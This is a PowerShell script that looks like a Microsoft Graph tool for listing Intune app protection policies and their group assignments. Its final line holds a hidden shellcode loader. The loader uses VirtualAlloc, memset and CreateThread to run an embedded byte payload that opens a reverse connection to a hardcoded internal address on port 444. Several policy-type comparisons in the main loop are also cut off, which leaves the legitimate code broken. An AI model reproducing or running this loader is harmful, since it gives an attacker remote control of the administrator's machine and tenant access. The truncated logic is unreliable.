




function Get-AuthToken {



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true)]
    $User
)

$userUpn = New-Object "System.Net.Mail.MailAddress" -ArgumentList $User

$tenant = $userUpn.Host

Write-Host "Checking for AzureAD module..."

    $AadModule = Get-Module -Name "AzureAD" -ListAvailable

    if ($AadModule -eq $null) {

        Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview"
        $AadModule = Get-Module -Name "AzureADPreview" -ListAvailable

    }

    if ($AadModule -eq $null) {
        write-host
        write-host "AzureAD Powershell module not installed..." -f Red
        write-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellow
        write-host "Script can't continue..." -f Red
        write-host
        exit
    }




    if($AadModule.count -gt 1){

        $Latest_Version = ($AadModule | select version | Sort-Object)[-1]

        $aadModule = $AadModule | ? { $_.version -eq $Latest_Version.version }

            

            if($AadModule.count -gt 1){

            $aadModule = $AadModule | select -Unique

            }

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

    else {

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

[System.Reflection.Assembly]::LoadFrom($adal) | Out-Null

[System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null

$clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547"

$redirectUri = "urn:ietf:wg:oauth:2.0:oob"

$resourceAppIdURI = "https://graph.microsoft.com"

$authority = "https://login.microsoftonline.com/$Tenant"

    try {

    $authContext = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority

    
    

    $platformParameters = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto"

    $userId = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ($User, "OptionalDisplayableId")

    $MethodArguments = [Type[]]@("System.String", "System.String", "System.Uri", "Microsoft.IdentityModel.Clients.ActiveDirectory.PromptBehavior", "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier")
    $NonAsync = $AuthContext.GetType().GetMethod("AcquireToken", $MethodArguments)

        if ($NonAsync -ne $null){

            $authResult = $authContext.AcquireToken($resourceAppIdURI, $clientId, [Uri]$redirectUri, [Microsoft.IdentityModel.Clients.ActiveDirectory.PromptBehavior]::Auto, $userId)
        
        }
        
        else {

            $authResult = $authContext.AcquireTokenAsync($resourceAppIdURI, $clientId, [Uri]$redirectUri, $platformParameters, $userId).Result 
        
        }

        

        if($authResult.AccessToken){

        

        $authHeader = @{
            'Content-Type'='application/json'
            'Authorization'="Bearer " + $authResult.AccessToken
            'ExpiresOn'=$authResult.ExpiresOn
            }

        return $authHeader

        }

        else {

        Write-Host
        Write-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor Red
        Write-Host
        break

        }

    }

    catch {

    write-host $_.Exception.Message -f Red
    write-host $_.Exception.ItemName -f Red
    write-host
    break

    }

}



Function Get-ManagedAppPolicy(){



[cmdletbinding()]

param
(
    $Name
)

$graphApiVersion = "Beta"
$Resource = "deviceAppManagement/managedAppPolicies"

    try {
    
        if($Name){
    
        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value | Where-Object { ($_.'displayName').contains("$Name") }
    
        }
    
        else {
    
        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value | Where-Object { ($_.'@odata.type').contains("ManagedAppProtection") -or ($_.'@odata.type').contains("InformationProtectionPolicy") }
    
        }
    
    }
    
    catch {
    
    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break
    
    }
    
}



Function Get-ManagedAppProtection(){



[cmdletbinding()]

param
(
    $id,
    $OS    
)

$graphApiVersion = "Beta"

    try {
    
        if($id -eq "" -or $id -eq $null){
    
        write-host "No Managed App Policy id specified, please provide a policy id..." -f Red
        break
    
        }
    
        else {
    
            if($OS -eq "" -or $OS -eq $null){
    
            write-host "No OS parameter specified, please provide an OS. Supported value are Android,iOS,WIP_WE,WIP_MDM..." -f Red
            Write-Host
            break
    
            }
    
            elseif($OS -eq "Android"){
    
            $Resource = "deviceAppManagement/androidManagedAppProtections('$id')/?`$expand=deploymentSummary,apps,assignments"
    
            $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
            Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get
    
            }
    
            elseif($OS -eq "iOS"){
    
            $Resource = "deviceAppManagement/iosManagedAppProtections('$id')/?`$expand=deploymentSummary,apps,assignments"
    
            $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
            Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get
    
            }

            elseif($OS -eq "WIP_WE"){
    
            $Resource = "deviceAppManagement/windowsInformationProtectionPolicies('$id')?`$expand=protectedAppLockerFiles,exemptAppLockerFiles,assignments"
    
            $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
            Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get
    
            }

            elseif($OS -eq "WIP_MDM"){
    
            $Resource = "deviceAppManagement/mdmWindowsInformationProtectionPolicies('$id')?`$expand=protectedAppLockerFiles,exemptAppLockerFiles,assignments"
    
            $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
            Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get

            }
    
        }
    
    }

    catch {
    
    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break
    
    }

}



Function Get-AADGroup(){



[cmdletbinding()]

param
(
    $GroupName,
    $id,
    [switch]$Members
)


$graphApiVersion = "v1.0"
$Group_resource = "groups"

    try {
    
        if($id){
    
        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=id eq '$id'"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value
    
        }
    
        elseif($GroupName -eq "" -or $GroupName -eq $null){
    
        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value
    
        }
    
        else {
    
            if(!$Members){
    
            $uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=displayname eq '$GroupName'"
            (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value
    
            }
    
            elseif($Members){
    
            $uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=displayname eq '$GroupName'"
            $Group = (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value
    
                if($Group){
    
                $GID = $Group.id
    
                $Group.displayName
                write-host
    
                $uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)/$GID/Members"
                (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value
    
                }
    
            }
    
        }
    
    }

    catch {
    
    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break
    
    }

}





write-host


if($global:authToken){

    
    $DateTime = (Get-Date).ToUniversalTime()
    
    
    $TokenExpires = ($authToken.ExpiresOn.datetime - $DateTime).Minutes
    
        if($TokenExpires -le 0){
    
        write-host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellow
        write-host
    
            
    
            if($User -eq $null -or $User -eq ""){
    
            $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
            Write-Host
    
            }
    
        $global:authToken = Get-AuthToken -User $User
    
        }
}



else {
    
    if($User -eq $null -or $User -eq ""){
    
    $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
    Write-Host
    
    }


$global:authToken = Get-AuthToken -User $User

}





write-host "Running query against Microsoft Graph for App Protection Policies" -f Yellow

$ManagedAppPolicies = Get-ManagedAppPolicy

write-host

foreach($ManagedAppPolicy in $ManagedAppPolicies){

write-host "Managed App Policy:"$ManagedAppPolicy.displayName -f Yellow

$ManagedAppPolicy

    
    
    if($ManagedAppPolicy.'@odata.type' -eq "
    
        $AndroidManagedAppProtection = Get-ManagedAppProtection -id $ManagedAppPolicy.id -OS "Android"
    
        write-host "Managed App Policy - Assignments" -f Cyan
    
        $AndroidAssignments = ($AndroidManagedAppProtection | select assignments).assignments
    
            if($AndroidAssignments){
    
                foreach($Group in $AndroidAssignments.target.groupId){
    
                (Get-AADGroup -id $Group).displayName
    
                }
    
                Write-Host
    
            }
    
            else {
    
            Write-Host "No assignments set for this policy..." -ForegroundColor Red
            Write-Host
    
            }
    
        write-host "Managed App Policy - Mobile Apps" -f Cyan
            
        if($ManagedAppPolicy.deployedAppCount -ge 1){
    
        ($AndroidManagedAppProtection | select apps).apps.mobileAppIdentifier
    
        }
    
        else {
    
        Write-Host "No Managed Apps targeted..." -ForegroundColor Red
        Write-Host
    
        }
    
    }

    
    
    elseif($ManagedAppPolicy.'@odata.type' -eq "
    
        $iOSManagedAppProtection = Get-ManagedAppProtection -id $ManagedAppPolicy.id -OS "iOS"
    
        write-host "Managed App Policy - Assignments" -f Cyan
    
        $iOSAssignments = ($iOSManagedAppProtection | select assignments).assignments
    
            if($iOSAssignments){
    
                foreach($Group in $iOSAssignments.target.groupId){
    
                (Get-AADGroup -id $Group).displayName
    
                }
    
                Write-Host
    
            }
    
            else {
    
            Write-Host "No assignments set for this policy..." -ForegroundColor Red
            Write-Host
    
            }
    
        write-host "Managed App Policy - Mobile Apps" -f Cyan
            
        if($ManagedAppPolicy.deployedAppCount -ge 1){
    
        ($iOSManagedAppProtection | select apps).apps.mobileAppIdentifier
    
        }
    
        else {
    
        Write-Host "No Managed Apps targeted..." -ForegroundColor Red
        Write-Host
    
        }
    
    }

    
    
    elseif($ManagedAppPolicy.'@odata.type' -eq "
    
        $Win10ManagedAppProtection = Get-ManagedAppProtection -id $ManagedAppPolicy.id -OS "WIP_WE"
    
        write-host "Managed App Policy - Assignments" -f Cyan
    
        $Win10Assignments = ($Win10ManagedAppProtection | select assignments).assignments
    
            if($Win10Assignments){
    
                foreach($Group in $Win10Assignments.target.groupId){
    
                (Get-AADGroup -id $Group).displayName
    
                }
    
                Write-Host
    
            }
    
            else {
    
            Write-Host "No assignments set for this policy..." -ForegroundColor Red
            Write-Host
    
            }
    
        write-host "Protected Apps" -f Cyan
            
        if($Win10ManagedAppProtection.protectedApps){
    
        $Win10ManagedAppProtection.protectedApps.displayName
    
        Write-Host

        }
    
        else {
    
        Write-Host "No Protected Apps targeted..." -ForegroundColor Red
        Write-Host
    
        }

        
        write-host "Protected AppLocker Files" -ForegroundColor Cyan

        if($Win10ManagedAppProtection.protectedAppLockerFiles){
    
        $Win10ManagedAppProtection.protectedAppLockerFiles.displayName

        Write-Host
    
        }
    
        else {
    
        Write-Host "No Protected Applocker Files targeted..." -ForegroundColor Red
        Write-Host
    
        }
    
    }

    
    
    elseif($ManagedAppPolicy.'@odata.type' -eq "
    
        $Win10ManagedAppProtection = Get-ManagedAppProtection -id $ManagedAppPolicy.id -OS "WIP_MDM"
    
        write-host "Managed App Policy - Assignments" -f Cyan
    
        $Win10Assignments = ($Win10ManagedAppProtection | select assignments).assignments
    
            if($Win10Assignments){
    
                foreach($Group in $Win10Assignments.target.groupId){
    
                (Get-AADGroup -id $Group).displayName
    
                }
    
                Write-Host
    
            }
    
            else {
    
            Write-Host "No assignments set for this policy..." -ForegroundColor Red
            Write-Host
    
            }
    
        write-host "Protected Apps" -f Cyan
            
        if($Win10ManagedAppProtection.protectedApps){
    
        $Win10ManagedAppProtection.protectedApps.displayName
    
        Write-Host

        }
    
        else {
    
        Write-Host "No Protected Apps targeted..." -ForegroundColor Red
        Write-Host
    
        }

        
        write-host "Protected AppLocker Files" -ForegroundColor Cyan

        if($Win10ManagedAppProtection.protectedAppLockerFiles){
    
        $Win10ManagedAppProtection.protectedAppLockerFiles.displayName

        Write-Host
    
        }
    
        else {
    
        Write-Host "No Protected Applocker Files targeted..." -ForegroundColor Red
        Write-Host
    
        }
    
    }

}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x06,0x68,0x02,0x00,0x01,0xbc,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

